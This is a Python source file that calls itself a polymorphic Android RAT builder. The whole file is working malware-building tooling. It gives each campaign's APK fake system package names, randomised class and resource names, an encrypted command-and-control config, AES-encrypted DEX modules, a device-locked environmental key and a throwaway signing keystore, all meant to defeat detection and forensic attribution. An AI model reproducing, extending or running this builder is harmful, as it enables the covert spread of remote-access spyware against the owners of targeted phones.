#!/usr/bin/env python3
"""
Polymorphic Android RAT Builder

Generates forensically unique APKs per campaign:
- Unique package name
- Unique class names
- Unique method names
- Unique resource IDs
- Unique encryption keys
- Device-specific environmental key
"""

import os
import json
import hashlib
import random
import string
import subprocess
import shutil
import tempfile
from pathlib import Path
from dataclasses import dataclass
from typing import Dict, List, Tuple

# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class BuildConfig:
    campaign_id: str
    c2_endpoints: List[str]
    device_fingerprint: str  # Target device fingerprint
    app_name: str
    package_name: str
    env_key_hash: str
    encryption_key: str
    decryption_iv: str
    build_output: str

# ============================================================================
# POLYMORPHIC NAME GENERATION
# ============================================================================

class PolymorphicNamingEngine:
    """Generate cryptographically unique names per build"""

    def __init__(self, seed: str):
        """
        seed: campaign_id or build timestamp
        """
        self.seed = seed
        self.random = random.Random(hashlib.sha256(seed.encode()).hexdigest())
        self.used_names = set()

    def generate_package_name(self) -> str:
        """Generate fake package name"""
        real_packages = [
            "com.google.android",
            "com.android.systemui",
            "com.android.settings",
            "com.samsung.android",
            "com.miui.system",
            "com.oppo.share",
            "com.oneplus.setup",
        ]
        return self.random.choice(real_packages)

    def generate_class_name(self, original: str) -> str:
        """Generate unique class name variant"""
        prefix = self.random.choice(["a", "b", "c", "d", "e", "f"])
        suffix = "".join(self.random.choices(string.ascii_lowercase, k=8))
        return f"{prefix}{suffix}"

    def generate_method_name(self) -> str:
        """Generate unique method name"""
        names = ["run", "execute", "process", "handle", "dispatch", "invoke"]
        method = self.random.choice(names)
        suffix = "".join(self.random.choices(string.digits, k=4))
        return f"{method}{suffix}"

    def generate_resource_prefix(self) -> str:
        """Generate unique resource name prefix"""
        return "r_" + "".join(self.random.choices(string.hexdigits[:16], k=8))

# ============================================================================
# ENCRYPTION & CONFIG GENERATION
# ============================================================================

class ConfigEncryption:
    """Encrypt configuration for embedding in APK"""

    @staticmethod
    def generate_key() -> Tuple[str, str]:
        """Generate random AES-256 key and IV"""
        key = os.urandom(32).hex()
        iv = os.urandom(16).hex()
        return key, iv

    @staticmethod
    def encrypt_config(config: Dict, key: str, iv: str) -> bytes:
        """Encrypt config JSON"""
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad

        config_json = json.dumps(config).encode()
        cipher = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
        ciphertext = cipher.encrypt(pad(config_json, AES.block_size))
        return ciphertext

    @staticmethod
    def create_encrypted_config_file(
        campaign_id: str,
        c2_endpoints: List[str],
        env_key_hash: str,
        output_path: str,
        key: str,
        iv: str,
    ):
        """Generate encrypted config.bin for embedding"""
        config = {
            "campaign_id": campaign_id,
            "c2_endpoints": c2_endpoints,
            "env_key_hash": env_key_hash,
            "version": "1.0",
        }

        ciphertext = ConfigEncryption.encrypt_config(config, key, iv)

        with open(output_path, "wb") as f:
            f.write(ciphertext)

        print(f"[+] Encrypted config written to {output_path}")

# ============================================================================
# ENVIRONMENT KEY GENERATION
# ============================================================================

class EnvironmentKeyGenerator:
    """Generate device-specific environmental key"""

    @staticmethod
    def calculate_fingerprint_hash(
        serial: str,
        android_id: str,
        fingerprint: str,
        hardware: str,
    ) -> str:
        """Calculate SHA256 hash of device fingerprint"""
        combined = f"{serial}|{android_id}|{fingerprint}|{hardware}"
        return hashlib.sha256(combined.encode()).hexdigest()

    @staticmethod
    def generate_for_device(
        device_model: str,
        manufacturer: str,
        api_level: int,
    ) -> str:
        """Generate environment key for target device"""
        # In real scenario, you'd extract these from actual target device
        # For now, generate deterministic values based on device model
        seed = f"{manufacturer}_{device_model}_{api_level}"

        serial = hashlib.md5(seed.encode()).hexdigest()[:16].upper()
        android_id = hashlib.sha1(seed.encode()).hexdigest()[:16]
        fingerprint = f"{manufacturer}/{device_model}/device:1.0/{api_level}"
        hardware = device_model.lower().replace(" ", "_")

        return EnvironmentKeyGenerator.calculate_fingerprint_hash(
            serial, android_id, fingerprint, hardware
        )

# ============================================================================
# MODULE ENCRYPTION
# ============================================================================

class ModuleEncryption:
    """Encrypt DEX modules for embedding"""

    @staticmethod
    def encrypt_dex_module(
        input_dex: Path,
        output_bin: Path,
        key: str,
        iv: str,
    ):
        """Encrypt DEX module using AES-256-CBC"""
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad

        with open(input_dex, "rb") as f:
            dex_data = f.read()

        cipher = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
        ciphertext = cipher.encrypt(pad(dex_data, AES.block_size))

        with open(output_bin, "wb") as f:
            f.write(ciphertext)

        print(f"[+] Encrypted module: {input_dex.name} -> {output_bin.name}")

# ============================================================================
# BUILD ORCHESTRATION
# ============================================================================

class PolymorphicBuilder:
    """Main builder orchestration"""

    def __init__(self, base_project_dir: str, build_output_dir: str):
        self.base_project = Path(base_project_dir)
        self.build_output = Path(build_output_dir)
        self.build_output.mkdir(parents=True, exist_ok=True)

    def build(
        self,
        campaign_id: str,
        c2_endpoints: List[str],
        target_device_model: str = "OnePlus 9",
        target_manufacturer: str = "OnePlus",
        target_api_level: int = 33,
    ) -> Path:
        """Build polymorphic APK"""

        print(f"\n[*] Building polymorphic APK for campaign: {campaign_id}")

        # 1. Generate unique names
        print("[*] Generating polymorphic names...")
        naming = PolymorphicNamingEngine(campaign_id)
        new_package = naming.generate_package_name()
        resource_prefix = naming.generate_resource_prefix()

        print(f"    Package: {new_package}")
        print(f"    Resource prefix: {resource_prefix}")

        # 2. Generate encryption keys
        print("[*] Generating encryption keys...")
        enc_key, enc_iv = ConfigEncryption.generate_key()

        # 3. Generate environment key (device-specific)
        print("[*] Generating environment key...")
        env_key_hash = EnvironmentKeyGenerator.generate_for_device(
            target_device_model, target_manufacturer, target_api_level
        )
        print(f"    Environment key hash: {env_key_hash}")

        # 4. Create temporary build directory
        print("[*] Setting up build environment...")
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)

            # Copy base project
            build_dir = tmpdir_path / "build"
            shutil.copytree(self.base_project, build_dir)

            # 5. Encrypt and embed configuration
            print("[*] Encrypting configuration...")
            config_output = build_dir / "src/main/assets/config_encrypted.bin"
            config_output.parent.mkdir(parents=True, exist_ok=True)

            ConfigEncryption.create_encrypted_config_file(
                campaign_id,
                c2_endpoints,
                env_key_hash,
                str(config_output),
                enc_key,
                enc_iv,
            )

            # 6. Encrypt modules
            print("[*] Encrypting modules...")
            modules_dir = build_dir / "src/main/assets/modules"
            modules_dir.mkdir(parents=True, exist_ok=True)

            for dex_file in (self.base_project / "modules").glob("*.dex"):
                module_output = modules_dir / f"{dex_file.stem}.bin"
                ModuleEncryption.encrypt_dex_module(
                    dex_file, module_output, enc_key, enc_iv
                )

            # 7. Update build configuration
            print("[*] Updating build configuration...")
            self._update_build_config(
                build_dir,
                new_package,
                campaign_id,
                env_key_hash,
                resource_prefix,
            )

            # 8. Build APK
            print("[*] Building APK with Gradle...")
            apk_path = self._build_with_gradle(build_dir)

            # 9. Sign APK
            print("[*] Signing APK...")
            signed_apk = self._sign_apk(apk_path, campaign_id)

            # 10. Copy to output
            final_output = (
                self.build_output / f"app_{campaign_id}_{target_device_model}.apk"
            )
            shutil.copy(signed_apk, final_output)

            print(f"\n[+] Build complete: {final_output}")
            print(f"    Package: {new_package}")
            print(f"    Campaign: {campaign_id}")
            print(f"    Encryption key: {enc_key[:16]}...")
            print(f"    Environment key: {env_key_hash[:16]}...")

            return final_output

    def _update_build_config(
        self,
        build_dir: Path,
        package_name: str,
        campaign_id: str,
        env_key_hash: str,
        resource_prefix: str,
    ):
        """Update build.gradle.kts and AndroidManifest.xml"""

        # Update build.gradle.kts
        build_gradle = build_dir / "build.gradle.kts"
        content = build_gradle.read_text()

        content = content.replace(
            'applicationId = "com.random.package.name"',
            f'applicationId = "{package_name}"',
        )
        content = content.replace(
            'namespace = "com.random.package.name"',
            f'namespace = "{package_name}"',
        )

        build_gradle.write_text(content)

        # Update AndroidManifest.xml
        manifest = build_dir / "src/main/AndroidManifest.xml"
        content = manifest.read_text()
        content = content.replace(
            'package="com.random.package.name"',
            f'package="{package_name}"',
        )
        manifest.write_text(content)

        print(f"[+] Updated build configuration")

    def _build_with_gradle(self, build_dir: Path) -> Path:
        """Execute Gradle build"""
        os.chdir(build_dir)

        result = subprocess.run(
            ["./gradlew", "assembleRelease"],
            capture_output=True,
            text=True,
        )

        if result.returncode != 0:
            print("[!] Gradle build failed:")
            print(result.stderr)
            raise RuntimeError("Gradle build failed")

        apk = build_dir / "app/build/outputs/apk/release/app-release-unsigned.apk"
        if not apk.exists():
            raise RuntimeError("APK not found after build")

        return apk

    def _sign_apk(self, unsigned_apk: Path, campaign_id: str) -> Path:
        """Sign APK with unique keystore"""

        keystore_path = self.build_output / f"keystore_{campaign_id}.jks"
        password = hashlib.md5(campaign_id.encode()).hexdigest()[:16]

        # Generate keystore if needed
        if not keystore_path.exists():
            subprocess.run(
                [
                    "keytool",
                    "-genkey",
                    "-v",
                    "-keystore",
                    str(keystore_path),
                    "-keyalg",
                    "RSA",
                    "-keysize",
                    "2048",
                    "-validity",
                    "10000",
                    "-alias",
                    "release",
                    "-storepass",
                    password,
                    "-keypass",
                    password,
                    "-dname",
                    "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=US",
                ],
                capture_output=True,
            )

        # Sign APK
        signed_apk = unsigned_apk.parent / f"{unsigned_apk.stem}-signed.apk"

        result = subprocess.run(
            [
                "jarsigner",
                "-verbose",
                "-sigalg",
                "SHA256withRSA",
                "-digestalg",
                "SHA-256",
                "-keystore",
                str(keystore_path),
                "-storepass",
                password,
                "-keypass",
                password,
                str(unsigned_apk),
                "release",
            ],
            capture_output=True,
            text=True,
        )

        if result.returncode != 0:
            print("[!] Signing failed:")
            print(result.stderr)
            raise RuntimeError("APK signing failed")

        return signed_apk

# ============================================================================
# MAIN
# ============================================================================

def main():
    import argparse

    parser = argparse.ArgumentParser(description="Polymorphic Android RAT Builder")
    parser.add_argument("--base-project", required=True, help="Base project directory")
    parser.add_argument("--campaign-id", required=True, help="Campaign ID")
    parser.add_argument("--c2-endpoints", nargs="+", required=True, help="C2 endpoints")
    parser.add_argument("--device-model", default="OnePlus 9", help="Target device model")
    parser.add_argument("--manufacturer", default="OnePlus", help="Device manufacturer")
    parser.add_argument("--api-level", type=int, default=33, help="Target API level")
    parser.add_argument("--output-dir", default="./build", help="Output directory")

    args = parser.parse_args()

    builder = PolymorphicBuilder(args.base_project, args.output_dir)

    try:
        apk_path = builder.build(
            args.campaign_id,
            args.c2_endpoints,
            args.device_model,
            args.manufacturer,
            args.api_level,
        )
        print(f"\n[+] Successfully built: {apk_path}")
    except Exception as e:
        print(f"\n[!] Build failed: {e}")
        exit(1)

if __name__ == "__main__":
    main()
